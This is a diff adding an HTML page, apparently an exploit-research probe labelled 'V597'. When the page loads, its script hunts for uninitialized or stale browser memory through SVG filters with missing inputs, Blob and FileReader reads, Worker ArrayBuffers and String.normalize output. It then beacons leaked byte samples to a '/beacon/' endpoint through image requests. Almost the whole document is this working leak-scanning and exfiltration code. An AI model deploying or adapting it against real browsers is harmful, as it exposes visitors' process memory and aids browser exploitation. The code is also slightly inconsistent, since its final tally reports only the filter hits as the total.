@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V597</title>
+</head>
+<body>
+<pre id="out">V597 — CSS filter uninit pixel buffer + Blob/Fetch stale heap</pre>
+
+<svg width="0" height="0" style="position:absolute">
+  <filter id="f1" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feColorMatrix in="nonexistent" type="matrix" values="1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0"/>
+  </filter>
+  <filter id="f2" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feMerge><feMergeNode in="nonexistent"/></feMerge>
+  </filter>
+  <filter id="f3" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feComposite in="SourceGraphic" in2="nonexistent" operator="in"/>
+  </filter>
+  <filter id="f4" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feDisplacementMap in="SourceGraphic" in2="nonexistent" scale="50"/>
+  </filter>
+  <filter id="f5" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feTile in="nonexistent"/>
+  </filter>
+  <filter id="f6" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feConvolveMatrix in="nonexistent" kernelMatrix="0 0 0 0 1 0 0 0 0" order="3"/>
+  </filter>
+  <filter id="f7" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feOffset in="nonexistent" dx="0" dy="0"/>
+  </filter>
+  <filter id="f8" x="0" y="0" width="300" height="300" filterUnits="userSpaceOnUse">
+    <feBlend in="SourceGraphic" in2="nonexistent" mode="normal"/>
+  </filter>
+</svg>
+
+<canvas id="c" width="300" height="300" style="display:none"></canvas>
+
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+function bk(tag,d){
+  var u='/beacon/V597-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+  try{new Image().src=u;}catch(e){}
+  setTimeout(function(){try{new Image().src=u+'&r=2';}catch(e){}},200);
+}
+bk('BOOT','v597-filter-uninit-blob-stale');
+
+/* Phase 0: Warm heap */
+say('P0: Warming heap...');
+var w=[];
+for(var i=0;i<5000;i++) w.push({x:i,fn:function(){return i;},a:[i,i+1,i+2]});
+w=null;
+for(var i=0;i<300;i++){
+  var ab=new ArrayBuffer(1024);
+  var u=new Uint8Array(ab);
+  for(var j=0;j<1024;j++) u[j]=0xDE;
+}
+say('Heap warmed.\n');
+
+var canvas=document.getElementById('c');
+var ctx=canvas.getContext('2d');
+var hits=[];
+
+/* =============== PART A: SVG Filter Uninit Pixel Buffer =============== */
+say('=== PART A: SVG Filter Uninit Scan ===');
+
+var FILTERS=['f1','f2','f3','f4','f5','f6','f7','f8'];
+var fIdx=0;
+
+function testNextFilter(){
+  if(fIdx>=FILTERS.length){
+    startPartB();
+    return;
+  }
+  var fid=FILTERS[fIdx];
+
+  try{
+    ctx.clearRect(0,0,300,300);
+    ctx.save();
+    ctx.filter='url(#'+fid+')';
+    ctx.fillStyle='rgba(128,128,128,0.5)';
+    ctx.fillRect(0,0,300,300);
+    ctx.restore();
+
+    var id=ctx.getImageData(0,0,300,300);
+    var d=id.data;
+    var nz=0, unexpected=0, sample='';
+
+    for(var j=0;j<d.length;j++){
+      if(d[j]!==0) nz++;
+      // Expected values from rgba(128,128,128,0.5) premultiplied: ~64,64,64,128
+      if(d[j]!==0 && d[j]!==64 && d[j]!==63 && d[j]!==65 && d[j]!==128 && d[j]!==127 && d[j]!==129){
+        unexpected++;
+        if(sample.length<40) sample+=('0'+d[j].toString(16)).slice(-2);
+      }
+    }
+
+    var res=fid+'|nz='+nz+'|unexp='+unexpected;
+    if(sample) res+='|hex='+sample;
+
+    if(unexpected>0){
+      hits.push(res);
+      say('**HIT** '+res);
+      bk('A-HIT',res);
+    } else {
+      say(fid+': nz='+nz+' unexp='+unexpected);
+    }
+  }catch(e){
+    say(fid+': ERR '+e.name+':'+e.message.slice(0,50));
+    bk('A-ERR',fid+'|'+e.name);
+  }
+
+  fIdx++;
+  setTimeout(testNextFilter,30);
+}
+
+/* =============== PART B: Blob/FileReader Stale Scan =============== */
+function startPartB(){
+  say('\n=== PART B: Blob/FileReader Uninit Scan ===');
+  bk('B-START','blob-fr');
+
+  var SIZES=[47,63,95,127,191,255,383,511,767,1023,1535,2047,4095];
+  var FILL=0x41;
+  var bHits=[];
+  var si=0,rep=0,REPS=30;
+
+  function nextBlob(){
+    if(si>=SIZES.length){
+      bk('B-DONE','hits='+bHits.length);
+      say('Part B: '+bHits.length+' mismatches');
+      if(bHits.length>0){
+        for(var i=0;i<Math.min(bHits.length,5);i++){
+          say('  '+bHits[i]);
+          bk('B-HIT',bHits[i]);
+        }
+      }
+      startPartC();
+      return;
+    }
+
+    var sz=SIZES[si];
+    var data=new Uint8Array(sz);
+    for(var j=0;j<sz;j++) data[j]=FILL;
+    var blob=new Blob([data]);
+
+    var reader=new FileReader();
+    reader.onload=function(){
+      var ab=reader.result;
+      var u8=new Uint8Array(ab);
+      for(var j=0;j<u8.length;j++){
+        if(u8[j]!==FILL){
+          bHits.push('sz='+sz+'|r='+rep+'|j='+j+'|v='+u8[j]);
+          break;
+        }
+      }
+      rep++;
+      if(rep>=REPS){rep=0;si++;}
+      nextBlob();
+    };
+    reader.onerror=function(){
+      rep++;
+      if(rep>=REPS){rep=0;si++;}
+      nextBlob();
+    };
+    reader.readAsArrayBuffer(blob);
+  }
+  nextBlob();
+}
+
+/* =============== PART C: Multi-segment Blob =============== */
+function startPartC(){
+  say('\n=== PART C: Multi-segment Blob ===');
+  bk('C-START','multi-seg');
+
+  var FILL=0x42;
+  var cHits=[];
+  var segs=[2,4,8,16,32,64];
+  var ci=0;
+
+  function nextSeg(){
+    if(ci>=segs.length){
+      bk('C-DONE','hits='+cHits.length);
+      say('Part C: '+cHits.length+' mismatches');
+      startPartD();
+      return;
+    }
+    var nseg=segs[ci];
+    var parts=[];
+    for(var s=0;s<nseg;s++){
+      var chunk=new Uint8Array(100);
+      for(var j=0;j<100;j++) chunk[j]=FILL;
+      parts.push(chunk);
+    }
+    var blob=new Blob(parts);
+
+    var reader=new FileReader();
+    reader.onload=function(){
+      var ab=reader.result;
+      var u8=new Uint8Array(ab);
+      for(var j=0;j<u8.length;j++){
+        if(u8[j]!==FILL){
+          cHits.push('segs='+nseg+'|j='+j+'|v='+u8[j]);
+          break;
+        }
+      }
+      ci++;
+      nextSeg();
+    };
+    reader.onerror=function(){ci++;nextSeg();};
+    reader.readAsArrayBuffer(blob);
+  }
+  nextSeg();
+}
+
+/* =============== PART D: Worker concurrent AB scan =============== */
+function startPartD(){
+  say('\n=== PART D: Worker AB scan ===');
+  bk('D-START','worker-scan');
+
+  var wc='self.onmessage=function(){'+
+    'var hits=[];'+
+    'var SIZES=[48,64,96,128,192,256,384,512,768,1024,1600,3200];'+
+    'for(var si=0;si<SIZES.length;si++){'+
+    '  var sz=SIZES[si];'+
+    '  for(var i=0;i<200;i++){'+
+    '    var ab=new ArrayBuffer(sz);'+
+    '    var u=new Uint8Array(ab);'+
+    '    for(var j=0;j<sz;j++){'+
+    '      if(u[j]!==0){'+
+    '        hits.push(sz+":"+i+":"+j+":"+u[j]);'+
+    '        break;'+
+    '      }'+
+    '    }'+
+    '  }'+
+    '}'+
+    'self.postMessage(hits);'+
+  '};';
+
+  try{
+    var w=new Worker(URL.createObjectURL(new Blob([wc],{type:'application/javascript'})));
+    w.onmessage=function(ev){
+      w.terminate();
+      var r=ev.data;
+      bk('D-DONE','hits='+r.length);
+      say('Part D: '+r.length+' non-zero ABs');
+      if(r.length>0){
+        for(var i=0;i<Math.min(r.length,5);i++){
+          say('  '+r[i]);
+          bk('D-HIT',r[i]);
+        }
+      }
+      startPartE();
+    };
+    w.onerror=function(ev){
+      bk('D-ERR',ev.message||'?');
+      say('Part D: Worker error');
+      startPartE();
+    };
+    w.postMessage(0);
+  }catch(e){
+    say('Part D: No workers ('+e.name+')');
+    startPartE();
+  }
+}
+
+/* =============== PART E: String.normalize stale scan =============== */
+function startPartE(){
+  say('\n=== PART E: String.normalize ===');
+  bk('E-START','normalize');
+
+  var eHits=[];
+  // Test various Unicode strings that require normalization
+  // NFC, NFD, NFKC, NFKD
+  var testStrings=[
+    'é',           // é (precomposed)
+    'é',          // e + combining acute
+    'ﬁ',           // fi ligature
+    'Ω',           // Ω (ohm sign)
+    'ẛ̣',     // ṡ + combining dot below
+    'Å',          // A + combining ring
+    'Å̧', // A + ring + cedilla
+  ];
+  var forms=['NFC','NFD','NFKC','NFKD'];
+
+  for(var fi=0;fi<forms.length;fi++){
+    for(var si=0;si<testStrings.length;si++){
+      try{
+        // Create a long string with the test char repeated
+        var s='';
+        for(var k=0;k<500;k++) s+=testStrings[si];
+
+        var norm=s.normalize(forms[fi]);
+        // Check for unexpected characters (stale heap data as UTF-16 chars)
+        for(var ci=0;ci<norm.length;ci++){
+          var cc=norm.charCodeAt(ci);
+          // Check for high bytes that look like pointers
+          if(cc>0x7F00 && cc<0xFFFF && cc!==0xFFFD){
+            eHits.push(forms[fi]+'|si='+si+'|ci='+ci+'|cc=0x'+cc.toString(16));
+            break;
+          }
+        }
+      }catch(e){}
+    }
+  }
+
+  bk('E-DONE','hits='+eHits.length);
+  say('Part E: '+eHits.length+' suspicious chars');
+  if(eHits.length>0){
+    for(var i=0;i<Math.min(eHits.length,5);i++){
+      say('  '+eHits[i]);
+      bk('E-HIT',eHits[i]);
+    }
+  }
+
+  finish();
+}
+
+function finish(){
+  say('\n=== V597 COMPLETE ===');
+  say('Total filter hits: '+hits.length);
+  say('All hits across tests: '+hits.length);
+  bk('DONE','fhits='+hits.length+'|total='+hits.length);
+  setTimeout(function(){bk('DONE','v597-complete');},5000);
+}
+
+// Start
+testNextFilter();
+
+</script></body></html>
